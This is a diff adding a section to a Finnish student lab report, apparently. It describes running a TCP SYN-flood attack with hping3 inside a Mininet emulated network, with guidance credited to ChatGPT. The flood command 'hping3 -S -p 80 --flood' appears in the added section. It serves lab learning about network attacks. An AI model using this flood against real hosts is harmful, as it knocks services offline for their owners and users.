@@ -36,3 +36,19 @@ Seuraavaksi vuorossa oli työkalun TURVALLINEN käyttökokeilu. En halua joutua 
 
 ![image](https://github.com/user-attachments/assets/ef938550-21b7-41af-9cbe-5b993553a53b)
 
+
+
+
+### b) TCP SYN-Flood hyökkäys
+Päätin tässä tehtävässä kysyä apua rakkaalta ystävältäni ChatGPT:ltä. Se antoi jälleen arvokkaan ohjenuoran, jota lähdin seuraamaan. Alkuun loin Mininet-ympäristön seuraavalla komennolla:
+
+    sudo mn --topo single,3 --mac --switch ovsk --controller=remote
+
+Kun ympäristö oli luotu, oli vuoro tehdä hyökkäys! Kuvassa näkyy palvelimen käynnistys portissa 80 h2:lla ja sen kuunteleminen.
+
+![image](https://github.com/user-attachments/assets/c2e6ed69-91e0-43a9-be5a-db51bcd6c7b1)
+
+Seuraavaksi oli hyökkäyksen vuoro! Tein sen seuraavalla komennolla:
+
+    h1 hping3 -S -p 80 --flood h2
+
